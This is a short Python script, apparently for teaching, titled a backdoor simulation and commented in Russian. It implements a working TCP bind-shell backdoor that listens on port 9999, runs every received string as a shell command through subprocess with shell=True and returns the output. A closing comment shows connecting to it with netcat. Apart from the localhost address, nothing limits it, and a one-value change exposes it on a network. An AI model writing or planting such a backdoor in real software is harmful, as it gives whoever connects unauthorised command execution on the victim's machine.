# backdoor_simulation.py
# Простой TCP-сервер, принимающий команды
import socket
import subprocess

HOST = '127.0.0.1'
PORT = 9999

def start_backdoor():
    with socket.socket() as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Бэкдор запущен на {HOST}:{PORT}...")
        conn, addr = s.accept()
        with conn:
            print(f"Подключено: {addr}")
            while True:
                command = conn.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except:
                    result = b"Ошибка выполнения"
                conn.send(result)

# Запустить: nc 127.0.0.1 9999
if __name__ == "__main__":
    start_backdoor()